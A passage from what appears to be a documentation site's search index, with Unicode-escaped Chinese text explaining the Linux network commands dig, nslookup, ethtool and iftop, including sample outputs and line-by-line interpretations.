\u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u5b83\u8fd8\u6709\u8bb8\u591a\u5176\u4ed6\u9009\u9879\u548c\u529f\u80fd\u53ef\u4ee5\u63a2\u7d22\u3002 \u547d\u4ee4\u7ed3\u679c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# dig www.baidu.com ; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14 <<>> www.baidu.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5539 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 ;; QUESTION SECTION: ;www.baidu.com. IN A ;; ANSWER SECTION: www.baidu.com. 380 IN CNAME www.a.shifen.com. www.a.shifen.com. 60 IN A 110.242.68.4 www.a.shifen.com. 60 IN A 110.242.68.3 ;; Query time: 1 msec ;; SERVER: 183.60.83.19#53(183.60.83.19) ;; WHEN: Thu Dec 21 12:34:59 CST 2023 ;; MSG SIZE rcvd: 90 \u8fd9\u662f\u4f7f\u7528 dig \u547d\u4ee4\u67e5\u8be2 www.baidu.com \u7684DNS\u4fe1\u606f\u65f6\u5f97\u5230\u7684\u8f93\u51fa ; <<>> DiG 9.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14 <<>> www.baidu.com \uff1a \u8fd9\u4e00\u884c\u663e\u793a\u4e86 dig \u547d\u4ee4\u7684\u7248\u672c\u4fe1\u606f\uff089.11.4-P2-RedHat-9.11.4-26.P2.el7_9.14\uff09\uff0c\u4ee5\u53ca\u88ab\u67e5\u8be2\u7684\u57df\u540d\uff08www.baidu.com\uff09\u3002 ;; global options: +cmd \uff1a \u8fd9\u8868\u793a dig \u4f7f\u7528\u7684\u5168\u5c40\u9009\u9879\uff0c +cmd \u8868\u793a\u663e\u793a\u547d\u4ee4\u884c\u53c2\u6570\u3002 ;; Got answer: \uff1a \u8fd9\u8868\u660e\u4e0b\u9762\u7684\u90e8\u5206\u5305\u542b\u4e86\u5bf9\u67e5\u8be2\u7684\u54cd\u5e94\u3002 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 5539 \uff1a opcode: QUERY \u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u6807\u51c6\u67e5\u8be2\u3002 status: NOERROR \u8868\u660e\u67e5\u8be2\u6210\u529f\uff0c\u6ca1\u6709\u9519\u8bef\u3002 id: 5539 \u662f\u8fd9\u6b21\u67e5\u8be2\u7684\u552f\u4e00\u6807\u8bc6\u7b26\u3002 ;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0 \uff1a flags \u5c55\u793a\u4e86\u4e0d\u540c\u7684DNS\u6807\u5fd7\uff1a qr \uff08\u67e5\u8be2\u54cd\u5e94\uff09\u8868\u793a\u8fd9\u662f\u4e00\u4e2a\u54cd\u5e94\u6d88\u606f\u3002 rd \uff08\u9012\u5f52\u8bf7\u6c42\uff09\u8868\u793a\u5ba2\u6237\u7aef\u5e0c\u671b\u670d\u52a1\u5668\u8fdb\u884c\u9012\u5f52\u67e5\u8be2\u3002 ra \uff08\u9012\u5f52\u53ef\u7528\uff09\u8868\u793a\u670d\u52a1\u5668\u53ef\u4ee5\u8fdb\u884c\u9012\u5f52\u67e5\u8be2\u3002 QUERY: 1 \u610f\u5473\u7740\u8be2\u95ee\u4e86\u4e00\u4e2a\u95ee\u9898\u3002 ANSWER: 3 \u8868\u660e\u6536\u5230\u4e863\u4e2a\u56de\u7b54\u3002 AUTHORITY: 0 \u548c ADDITIONAL: 0 \u8868\u793a\u6ca1\u6709\u6743\u5a01\u548c\u9644\u52a0\u90e8\u5206\u7684\u8bb0\u5f55\u3002 ;; QUESTION SECTION: \uff1a \u8fd9\u662f\u67e5\u8be2\u90e8\u5206\uff0c\u663e\u793a\u4e86\u8fdb\u884c\u7684\u67e5\u8be2\u3002 ;www.baidu.com. IN A \uff1a \u8fd9\u662f\u5b9e\u9645\u7684\u67e5\u8be2\u3002\u67e5\u8be2 www.baidu.com \u7684 A \u8bb0\u5f55\uff0c\u5373IP\u5730\u5740\u3002 ;; ANSWER SECTION: \uff1a \u8fd9\u90e8\u5206\u5305\u542b\u4e86\u5bf9\u67e5\u8be2\u7684\u56de\u7b54\u3002 www.baidu.com. 380 IN CNAME www.a.shifen.com. \uff1a \u8fd9\u8868\u660e www.baidu.com \u662f\u4e00\u4e2a\u522b\u540d\uff0c\u5b9e\u9645\u7684\u540d\u79f0\u662f www.a.shifen.com \uff08CNAME\u8bb0\u5f55\uff09\u3002 www.a.shifen.com. 60 IN A 110.242.68.4 \uff1a www.a.shifen.com. 60 IN A 110.242.68.3 \uff1a \u8fd9\u4e24\u884c\u663e\u793a www.a.shifen.com \u7684A\u8bb0\u5f55\uff0c\u5373\u5176IP\u5730\u5740\uff0c\u5206\u522b\u4e3a110.242.68.4\u548c110.242.68.3\u3002 ;; Query time: 1 msec \uff1a \u67e5\u8be2\u8017\u65f61\u6beb\u79d2\u3002 ;; SERVER: 183.60.83.19#53(183.60.83.19) \uff1a \u6307\u51fa\u4e86\u54cd\u5e94\u67e5\u8be2\u7684DNS\u670d\u52a1\u5668\u7684IP\u5730\u5740\u548c\u7aef\u53e3\u53f7\uff08183.60.83.19\uff0c\u7aef\u53e353\uff09\u3002 ;; WHEN: Thu Dec 21 12:34:59 CST 2023 \uff1a \u67e5\u8be2\u53d1\u751f\u7684\u65f6\u95f4\u3002 ;; MSG SIZE rcvd: 90 \uff1a \u63a5\u6536\u5230\u7684\u6d88\u606f\u5927\u5c0f\u4e3a90\u5b57\u8282\u3002 \u8fd9\u4e2a\u8f93\u51fa\u63d0\u4f9b\u4e86\u8be6\u7ec6\u7684\u4fe1\u606f\u5173\u4e8e www.baidu.com \u7684DNS\u8bb0\u5f55\uff0c\u5305\u62ec\u5176CNAME\u8bb0\u5f55\u548c\u76f8\u5e94\u7684IP\u5730\u5740\u3002","title":"dig"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/dig/#nslookup","text":"nslookup \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u7ba1\u7406\u5458\u5de5\u5177\uff0c\u7528\u4e8e\u67e5\u8be2DNS\uff08\u57df\u540d\u7cfb\u7edf\uff09\u6765\u83b7\u53d6\u57df\u540d\u6216IP\u5730\u5740\u7684\u76f8\u5173\u4fe1\u606f\u3002\u8fd9\u91cc\u662f\u4e00\u4e9b\u57fa\u672c\u548c\u9ad8\u7ea7\u7684 nslookup \u7528\u6cd5\uff1a \u57fa\u7840\u67e5\u8be2 \u67e5\u8be2\u57df\u540d\u7684IP\u5730\u5740 : nslookup example.com \u8fd9\u4f1a\u8fd4\u56de example.com \u7684IP\u5730\u5740\u3002 \u53cd\u5411DNS\u67e5\u8be2\uff08\u6839\u636eIP\u5730\u5740\u67e5\u8be2\u57df\u540d\uff09 : nslookup 192.0.2.1 \u8fd9\u4f1a\u8fd4\u56de\u4e0eIP\u5730\u5740 192.0.2.1 \u5173\u8054\u7684\u57df\u540d\u3002 \u6307\u5b9aDNS\u670d\u52a1\u5668 \u4f7f\u7528\u7279\u5b9aDNS\u670d\u52a1\u5668\u67e5\u8be2 : nslookup example.com 8.8.8.8 \u4f7f\u7528Google\u7684DNS\u670d\u52a1\u5668\uff088.8.8.8\uff09\u67e5\u8be2 example.com \u3002 \u67e5\u8be2\u7279\u5b9a\u7c7b\u578b\u7684DNS\u8bb0\u5f55 \u67e5\u8be2MX\uff08\u90ae\u4ef6\u4ea4\u6362\uff09\u8bb0\u5f55 : nslookup -type=mx example.com \u67e5\u8be2 example.com \u7684\u90ae\u4ef6\u670d\u52a1\u5668\u8bb0\u5f55\u3002 \u67e5\u8be2NS\uff08\u540d\u79f0\u670d\u52a1\u5668\uff09\u8bb0\u5f55 : nslookup -type=ns example.com \u67e5\u8be2\u7ba1\u7406 example.com \u7684TXT\u8bb0\u5f55\uff0c\u5e38\u7528\u4e8eSPF\u8bb0\u5f55\u6216\u5176\u4ed6\u9a8c\u8bc1\u4fe1\u606f\u3002 \u67e5\u8be2A\uff08\u5730\u5740\uff09\u8bb0\u5f55 : nslookup -type=a example.com \u67e5\u8be2 example.com \u7684IPv4\u5730\u5740\u3002 \u67e5\u8be2AAAA\uff08IPv6\u5730\u5740\uff09\u8bb0\u5f55 : nslookup -type=aaaa example.com \u67e5\u8be2 example.com \u7684IPv6\u5730\u5740\u3002 \u4f7f\u7528\u4ea4\u4e92\u6a21\u5f0f \u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f : nslookup \u5728\u4ea4\u4e92\u6a21\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u8fde\u7eed\u8fdb\u884c\u591a\u6b21\u67e5\u8be2\u800c\u65e0\u9700\u91cd\u590d\u8f93\u5165 nslookup \u3002 \u5728\u4ea4\u4e92\u6a21\u5f0f\u4e2d\u8bbe\u7f6e\u7c7b\u578b : > set type=mx > example.com \u9996\u5148\u8bbe\u7f6e\u67e5\u8be2\u7c7b\u578b\u4e3aMX\uff0c\u7136\u540e\u67e5\u8be2 example.com \u3002 \u9000\u51fa\u4ea4\u4e92\u6a21\u5f0f : > exit \u9ad8\u7ea7\u7528\u6cd5 \u5f00\u542f\u8be6\u7ec6\u8f93\u51fa : nslookup -debug example.com \u63d0\u4f9b\u67e5\u8be2\u8fc7\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6709\u52a9\u4e8e\u8c03\u8bd5\u3002 \u67e5\u8be2SOA\uff08\u8d77\u59cb\u6388\u6743\uff09\u8bb0\u5f55 : nslookup -type=soa example.com \u67e5\u8be2 example.com \u7684SOA\u8bb0\u5f55\uff0c\u5305\u542b\u5173\u4e8e\u57df\u540d\u7ba1\u7406\u7684\u4fe1\u606f\u3002 \u6ce8\u610f\u4e8b\u9879 \u5728\u4f7f\u7528 nslookup \u65f6\uff0c\u786e\u4fdd\u8f93\u5165\u6b63\u786e\u7684\u57df\u540d\u6216IP\u5730\u5740\u3002 \u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u6216 nslookup \u7684\u7248\u672c\u53ef\u80fd\u5728\u547d\u4ee4\u884c\u9009\u9879\u4e0a\u6709\u6240\u5dee\u5f02\u3002 nslookup \u4e3b\u8981\u7528\u4e8e\u8bca\u65ad\u548c\u89e3\u51b3DNS\u76f8\u5173\u7684\u95ee\u9898\uff0c\u5bf9\u4e8e\u65e5\u5e38\u7684\u7f51\u7edc\u95ee\u9898\u6392\u67e5\u975e\u5e38\u6709\u7528\u3002 \u901a\u8fc7\u8fd9\u4e9b\u4e0d\u540c\u7684\u547d\u4ee4\u548c\u9009\u9879\uff0c\u53ef\u4ee5\u63a2\u7d22\u548c\u7406\u89e3\u57df\u540d\u7cfb\u7edf\u7684\u5de5\u4f5c\u65b9\u5f0f\u53ca\u5176\u914d\u7f6e\u3002 \u547d\u4ee4\u7ed3\u679c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# nslookup www.baidu.com Server: 183.60.83.19 Address: 183.60.83.19#53 Non-authoritative answer: www.baidu.com canonical name = www.a.shifen.com. Name: www.a.shifen.com Address: 220.181.38.149 Name: www.a.shifen.com Address: 220.181.38.150 Name: www.a.shifen.com Address: 240e:83:205:58:0:ff:b09f:36bf Name: www.a.shifen.com Address: 240e:83:205:5a:0:ff:b05f:346b \u4e0b\u9762\u662f\u5bf9\u60a8\u63d0\u4f9b\u7684 nslookup \u67e5\u8be2\u7ed3\u679c\u7684\u9010\u884c\u89e3\u91ca\uff1a [root@VM-0-16-centos ~]# nslookup www.baidu.com \u8fd9\u662f\u60a8\u5728\u547d\u4ee4\u884c\u754c\u9762\u8f93\u5165\u7684\u547d\u4ee4\uff0c\u8868\u793a\u60a8\u8981\u4f7f\u7528 nslookup \u5de5\u5177\u67e5\u8be2 www.baidu.com \u57df\u540d\u7684DNS\u4fe1\u606f\u3002 Server: 183.60.83.19 \u8fd9\u4e00\u884c\u8868\u793a\u5904\u7406\u60a8\u7684DNS\u67e5\u8be2\u7684\u670d\u52a1\u5668\u7684IP\u5730\u5740\u662f 183.60.83.19 \u3002\u8fd9\u662f\u60a8\u7684\u7f51\u7edc\u914d\u7f6e\u4e2d\u6307\u5b9a\u7684DNS\u670d\u52a1\u5668\uff0c\u6216\u8005\u662f\u60a8\u7cfb\u7edf\u9ed8\u8ba4\u7684DNS\u670d\u52a1\u5668\u3002 Address: 183.60.83.19#53 \u8fd9\u4e00\u884c\u663e\u793a\u4e86\u4e0a\u8ff0DNS\u670d\u52a1\u5668\u7684IP\u5730\u5740 ( 183.60.83.19 ) \u548c\u4f7f\u7528\u7684\u7aef\u53e3\u53f7 ( #53 )\u3002DNS\u67e5\u8be2\u901a\u5e38\u4f7f\u752853\u7aef\u53e3\u3002 Non-authoritative answer \u8fd9\u610f\u5473\u7740\u8fd9\u4e2a\u54cd\u5e94\u4e0d\u662f\u6765\u81ea\u5b58\u50a8\u6709 www.baidu.com \u57df\u540d\u8bb0\u5f55\u7684\u6743\u5a01DNS\u670d\u52a1\u5668\uff0c\u800c\u662f\u6765\u81ea\u4e00\u4e2a\u7f13\u5b58\u8fd9\u4e9b\u4fe1\u606f\u7684\u670d\u52a1\u5668\u3002\u975e\u6743\u5a01\u56de\u7b54\u901a\u5e38\u6765\u81ea\u672c\u5730DNS\u670d\u52a1\u5668\u6216ISP\u7684DNS\u670d\u52a1\u5668\u3002 www.baidu.com canonical name = www.a.shifen.com. \u8fd9\u8868\u660e www.baidu.com \u6709\u4e00\u4e2aCNAME\uff08\u89c4\u8303\u540d\uff09\u8bb0\u5f55\u6307\u5411 www.a.shifen.com \u3002CNAME\u8bb0\u5f55\u662f\u4e00\u79cdDNS\u8bb0\u5f55\uff0c\u5b83\u5c06\u4e00\u4e2a\u57df\u540d\u6620\u5c04\u5230\u53e6\u4e00\u4e2a\u57df\u540d\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5f53\u4f60\u8bbf\u95ee www.baidu.com \u65f6\uff0c\u5b9e\u9645\u4e0a\u88ab\u5f15\u5bfc\u5230 www.a.shifen.com \u3002 Name: www.a.shifen.com \u8fd9\u4e00\u884c\u8868\u660e\u63a5\u4e0b\u6765\u7684IP\u5730\u5740\u5c5e\u4e8e www.a.shifen.com \u3002 Address: 220.181.38.149 \u8fd9\u662f www.a.shifen.com \u7684\u4e00\u4e2aIPv4\u5730\u5740\u3002\u8fd9\u610f\u5473\u7740 www.baidu.com \uff08\u901a\u8fc7 www.a.shifen.com \uff09\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e2aIP\u5730\u5740\u8bbf\u95ee\u3002 Name: www.a.shifen.com Address: 220.181.38.150 \u8fd9\u662f\u53e6\u4e00\u4e2aIPv4\u5730\u5740\uff0c\u5c5e\u4e8e\u540c\u4e00\u4e2a\u57df\u540d\uff08 www.a.shifen.com \uff09\u3002\u591a\u4e2a\u5730\u5740\u7684\u5b58\u5728\u53ef\u80fd\u662f\u4e3a\u4e86\u8d1f\u8f7d\u5747\u8861\u548c\u5197\u4f59\u3002 Name: www.a.shifen.com Address: 240e:83:205:58:0:ff:b09f:36bf \u8fd9\u662f www.a.shifen.com \u7684\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2aIPv6\u7f51\u7edc\u7684\u8bbf\u95ee\u70b9\u3002 Name: www.a.shifen.com Address: 240e:83:205:5a:0:ff:b05f:346b \u53e6\u4e00\u4e2aIPv6\u5730\u5740\uff0c\u540c\u6837\u5c5e\u4e8e www.a.shifen.com \u3002\u4e0eIPv4\u5730\u5740\u7c7b\u4f3c\uff0c\u591a\u4e2aIPv6\u5730\u5740\u7684\u5b58\u5728\u53ef\u80fd\u4e5f\u662f\u51fa\u4e8e\u8d1f\u8f7d\u5747\u8861\u548c\u5197\u4f59\u7684\u8003\u8651\u3002 \u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a nslookup \u67e5\u8be2\u5c55\u793a\u4e86 www.baidu.com \u5982\u4f55\u901a\u8fc7CNAME\u8bb0\u5f55\u6307\u5411 www.a.shifen.com \uff0c\u4ee5\u53ca\u540e\u8005\u7684\u591a\u4e2aIPv4\u548cIPv6\u5730\u5740\uff0c\u8fd9\u4e9b\u5730\u5740\u53ef\u80fd\u7528\u4e8e\u5904\u7406\u4e0d\u540c\u7684\u7f51\u7edc\u8bf7\u6c42\uff0c\u786e\u4fdd\u53ef\u9760\u6027\u548c\u9ad8\u6548\u6027\u3002","title":"nslookup"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/ethtool/","text":"ethtool\u547d\u4ee4 ethtool\u662f\u7528\u4e8e\u67e5\u8be2\u53ca\u8bbe\u7f6e\u7f51\u5361\u53c2\u6570\u7684\u547d\u4ee4\u3002 ethtool\uff088\uff09 - Linux \u624b\u518c\u9875 (die.net) ethtool linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) ethtool \u547d\u4ee4\uff0cLinux ethtool \u547d\u4ee4\u8be6\u89e3\uff1a\u663e\u793a\u6216\u4fee\u6539\u4ee5\u592a\u7f51\u5361\u7684\u914d\u7f6e\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) Linux\u4e0bethtool\u6307\u4ee4\u8be6\u89e3 CSDN\u535a\u5ba2 ethtool \u539f\u7406\u4ecb\u7ecd\u548c\u89e3\u51b3\u7f51\u5361\u4e22\u5305\u6392\u67e5\u601d\u8def_CSDN\u535a\u5ba2 Linux\u547d\u4ee4\u4e4bethtool\u547d\u4ee4\uff08\u67e5\u770b\u5149\u6a21\u5757\u4fe1\u606f\uff09 - \u7801\u519c\u6559\u7a0b (manongjc.com) \u67e5\u770b\u7f51\u5361\u4fe1\u606f #ethtool eth0 Settings for eth0: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Supported pause frame use: Symmetric Supports auto-negotiation: Yes Advertised link modes: 1000baseT/Full Advertised pause frame use: Symmetric Advertised auto-negotiation: Yes Speed: 1000Mb/s Duplex: Full Port: Twisted Pair PHYAD: 1 Transceiver: internal Auto-negotiation: on MDI-X: on (auto) Supports Wake-on: pumbg Wake-on: g Current message level: 0x00000007 (7) drv probe link Link detected: yes Mb/s\u662f Mbps\u7684\u7f29\u5199\uff0c\u8fd9\u4e2a\u5361\u662fGE\u5361\uff0c\u5373\u662f1000Mbps\uff0c\u4e5f\u662f1Gbps. \u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u4e3a125MB/s\u3002 10GE\u5361\uff0c\u5373\u662f10000Mbps\uff0c\u4e5f\u662f10Gbps.\u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u4e3a1250MB/s\u3002\u6709\u7684\u673a\u5668ethtool\u67e5\u8be2\u7f51\u5361\u65f6\uff0c\u7f51\u5361\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u9700\u8981\u767b\u9646\u5230\u7269\u7406\u673a\u5e26\u5916\u7cfb\u7edf\u8fdb\u884c\u67e5\u770b","title":"ethtool\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/ethtool/#ethtool","text":"ethtool\u662f\u7528\u4e8e\u67e5\u8be2\u53ca\u8bbe\u7f6e\u7f51\u5361\u53c2\u6570\u7684\u547d\u4ee4\u3002 ethtool\uff088\uff09 - Linux \u624b\u518c\u9875 (die.net) ethtool linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) ethtool \u547d\u4ee4\uff0cLinux ethtool \u547d\u4ee4\u8be6\u89e3\uff1a\u663e\u793a\u6216\u4fee\u6539\u4ee5\u592a\u7f51\u5361\u7684\u914d\u7f6e\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) Linux\u4e0bethtool\u6307\u4ee4\u8be6\u89e3 CSDN\u535a\u5ba2 ethtool \u539f\u7406\u4ecb\u7ecd\u548c\u89e3\u51b3\u7f51\u5361\u4e22\u5305\u6392\u67e5\u601d\u8def_CSDN\u535a\u5ba2 Linux\u547d\u4ee4\u4e4bethtool\u547d\u4ee4\uff08\u67e5\u770b\u5149\u6a21\u5757\u4fe1\u606f\uff09 - \u7801\u519c\u6559\u7a0b (manongjc.com)","title":"ethtool\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/ethtool/#_1","text":"#ethtool eth0 Settings for eth0: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Supported pause frame use: Symmetric Supports auto-negotiation: Yes Advertised link modes: 1000baseT/Full Advertised pause frame use: Symmetric Advertised auto-negotiation: Yes Speed: 1000Mb/s Duplex: Full Port: Twisted Pair PHYAD: 1 Transceiver: internal Auto-negotiation: on MDI-X: on (auto) Supports Wake-on: pumbg Wake-on: g Current message level: 0x00000007 (7) drv probe link Link detected: yes Mb/s\u662f Mbps\u7684\u7f29\u5199\uff0c\u8fd9\u4e2a\u5361\u662fGE\u5361\uff0c\u5373\u662f1000Mbps\uff0c\u4e5f\u662f1Gbps. \u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u4e3a125MB/s\u3002 10GE\u5361\uff0c\u5373\u662f10000Mbps\uff0c\u4e5f\u662f10Gbps.\u6700\u5927\u4e0b\u8f7d\u901f\u5ea6\u4e3a1250MB/s\u3002\u6709\u7684\u673a\u5668ethtool\u67e5\u8be2\u7f51\u5361\u65f6\uff0c\u7f51\u5361\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u9700\u8981\u767b\u9646\u5230\u7269\u7406\u673a\u5e26\u5916\u7cfb\u7edf\u8fdb\u884c\u67e5\u770b","title":"\u67e5\u770b\u7f51\u5361\u4fe1\u606f"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/iftop/","text":"iftop\u547d\u4ee4 \u5e38\u89c1\u7528\u6cd5 iftop \u662f\u4e00\u4e2a\u975e\u5e38\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u7528\u4e8e\u76d1\u63a7\u7f51\u7edc\u63a5\u53e3\u7684\u5b9e\u65f6\u6d41\u91cf\u3002\u4ee5\u4e0b\u662f\u4e00\u4e9b iftop \u7684\u5e38\u7528\u7528\u6cd5\u548c\u547d\u4ee4\u9009\u9879\uff1a \u57fa\u672c\u7528\u6cd5 \uff1a \u76f4\u63a5\u8fd0\u884c iftop \u6765\u89c2\u5bdf\u6240\u6709\u7f51\u7edc\u63a5\u53e3\u7684\u6d41\u91cf\uff1a sudo iftop \u6307\u5b9a\u7f51\u7edc\u63a5\u53e3 \uff1a \u901a\u8fc7 -i \u9009\u9879\u6307\u5b9a\u8981\u76d1\u63a7\u7684\u7279\u5b9a\u7f51\u7edc\u63a5\u53e3\uff1a sudo iftop -i eth0 \u663e\u793a\u6570\u5b57IP\u5730\u5740\u800c\u975e\u4e3b\u673a\u540d \uff1a \u4f7f\u7528 -n \u9009\u9879\u6765\u963b\u6b62 iftop \u5c06 IP \u5730\u5740\u89e3\u6790\u4e3a\u4e3b\u673a\u540d\uff1a sudo iftop -n \u663e\u793a\u7aef\u53e3\u53f7 \uff1a \u4f7f\u7528 -P \u9009\u9879\u663e\u793a\u6e90\u548c\u76ee\u7684\u7aef\u53e3\u53f7\uff1a sudo iftop -P \u8bbe\u7f6e\u6d41\u91cf\u8fc7\u6ee4\u89c4\u5219 \uff1a \u4f7f\u7528 -f \u9009\u9879\u6765\u5e94\u7528\u8fc7\u6ee4\u89c4\u5219\uff0c\u53ea\u663e\u793a\u7b26\u5408\u7279\u5b9a\u6761\u4ef6\u7684\u6d41\u91cf\u3002\u4f8b\u5982\uff0c\u53ea\u663e\u793a\u76ee\u7684\u7aef\u53e3\u4e3a 80 \u7684\u6d41\u91cf\uff1a sudo iftop -f \"dst port 80\" \u9650\u5236\u663e\u793a\u7684\u884c\u6570 \uff1a \u4f7f\u7528 -L \u9009\u9879\u6765\u9650\u5236\u663e\u793a\u7684\u884c\u6570\u3002\u4f8b\u5982\uff0c\u53ea\u663e\u793a\u524d 10 \u884c\u6570\u636e\uff1a sudo iftop -L 10 \u4f7f\u7528\u975e\u7279\u6743\u7528\u6237\u8fd0\u884c \uff1a \u5982\u679c\u4f60\u5df2\u7ecf\u5bf9 iftop \u8bbe\u7f6e\u4e86\u9002\u5f53\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u65e0\u9700 sudo \u8fd0\u884c\uff1a iftop \u663e\u793a\u4e24\u4e2a\u6307\u5b9a\u4e3b\u673a\u95f4\u7684\u6d41\u91cf \uff1a \u4f7f\u7528 -F \u9009\u9879\u6765\u8fc7\u6ee4\u5e76\u663e\u793a\u4e24\u4e2a\u7279\u5b9a\u7f51\u7edc\u5730\u5740\u4e4b\u95f4\u7684\u6d41\u91cf\u3002\u4f8b\u5982\uff1a sudo iftop -F 192.168.1.1/24 \u5e2e\u52a9\u4fe1\u606f \uff1a \u663e\u793a iftop \u7684\u5e2e\u52a9\u4fe1\u606f\uff0c\u4e86\u89e3\u66f4\u591a\u9009\u9879\u548c\u7528\u6cd5\uff1a iftop -h \u547d\u4ee4\u7ed3\u679c\u89e3\u91ca \u8fd9\u5f20 iftop \u7684\u622a\u56fe\u663e\u793a\u4e86\u901a\u8fc7 eth0 \u7f51\u7edc\u63a5\u53e3\u7684\u5b9e\u65f6\u7f51\u7edc\u6d41\u91cf\uff0c\u5e76\u4e14\u4f7f\u7528 -P \u53c2\u6570\u6765\u5c55\u793a\u7aef\u53e3\u4fe1\u606f\u3002\u4e0b\u9762\u662f\u5bf9\u5c4f\u5e55\u7684\u89e3\u91ca\uff1a \u6bcf\u4e00\u884c \uff1a\u4ee3\u8868\u4e00\u4e2a\u6d3b\u52a8\u7684\u7f51\u7edc\u8fde\u63a5\u3002\u6bcf\u4e2a\u8fde\u63a5\u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff1a\u6e90\u5730\u5740\uff08\u5de6\u4fa7\uff09\u3001\u76ee\u7684\u5730\u5740\uff08\u4e2d\u95f4\uff09\u548c\u6d41\u91cf\u7edf\u8ba1\uff08\u53f3\u4fa7\uff09\u3002 \u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740 \uff1a\u5de6\u4fa7\u548c\u4e2d\u95f4\u7684\u5217\u663e\u793a\u4e86\u6bcf\u4e2a\u7f51\u7edc\u8fde\u63a5\u7684\u4e24\u7aef\u3002\u5730\u5740\u540e\u9762\u53ef\u80fd\u8ddf\u6709\u7aef\u53e3\u53f7\uff0c\u5982 ssh \u6216 http \u7b49\uff0c\u8868\u793a\u5bf9\u5e94\u7684\u670d\u52a1\u3002 \u6d41\u91cf\u7edf\u8ba1 \uff1a\u53f3\u4fa7\u7684\u4e09\u7ec4\u6570\u5b57\u5206\u522b\u4ee3\u8868\u8fc7\u53bb 2 \u79d2\u300110 \u79d2\u548c 40 \u79d2\u5185\u7684\u5e73\u5747\u6d41\u91cf\u901f\u7387\u3002\u8fd9\u4e9b\u6570\u503c\u901a\u5e38\u6709\u4e09\u79cd\uff1a <= \u8868\u793a\u6d41\u5165\u7684\u6d41\u91cf\uff0c => \u8868\u793a\u6d41\u51fa\u7684\u6d41\u91cf\uff0c <=> \u8868\u793a\u53cc\u5411\u7684\u6d41\u91cf\u3002 TX \u548c RX \uff1a\u5e95\u90e8\u7684 TX \u8868\u793a\u4f20\u8f93\uff08\u53d1\u9001\uff09\u7684\u6570\u636e\u603b\u91cf\uff0c RX \u8868\u793a\u63a5\u6536\u7684\u6570\u636e\u603b\u91cf\u3002 cum\u3001peak \u548c rates \uff1a cum \uff1a\u8868\u793a\u81ea iftop \u542f\u52a8\u4ee5\u6765\u7684\u7d2f\u79ef\u6d41\u91cf\u3002 peak \uff1a\u663e\u793a\u89c2\u5bdf\u671f\u95f4\u7684\u6700\u9ad8\u6d41\u91cf\u5cf0\u503c\u3002 rates \uff1a\u5c55\u793a\u5f53\u524d\u7684\u5e73\u5747\u6d41\u91cf\u901f\u7387\uff0c\u5206\u522b\u5bf9\u5e94\u8fc7\u53bb 2 \u79d2\u300110 \u79d2\u548c 40 \u79d2\u7684\u5e73\u5747\u503c\u3002 TOTAL \uff1a\u5e95\u90e8\u7684 TOTAL \u884c\u663e\u793a\u4e86\u4f20\u8f93\u548c\u63a5\u6536\u6570\u636e\u7684\u603b\u548c\u3002 \u7bad\u5934 \uff1a\u6d41\u91cf\u7684\u65b9\u5411\u7531\u7bad\u5934\u6307\u793a\uff0c <= \u8868\u793a\u63a5\u6536\uff0c => \u8868\u793a\u53d1\u9001\u3002 \u5728\u5b9e\u9645\u60c5\u51b5\u4e2d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5e2e\u52a9\u4f60\u76d1\u63a7\u7f51\u7edc\u6d41\u91cf\u7684\u5927\u5c0f\u3001\u6d41\u5411\u4ee5\u53ca\u968f\u65f6\u95f4\u7684\u53d8\u5316\u60c5\u51b5\uff0c\u4ece\u800c\u5bf9\u7f51\u7edc\u4f7f\u7528\u60c5\u51b5\u6709\u4e00\u4e2a\u76f4\u89c2\u7684\u7406\u89e3\u3002 \u5728 iftop 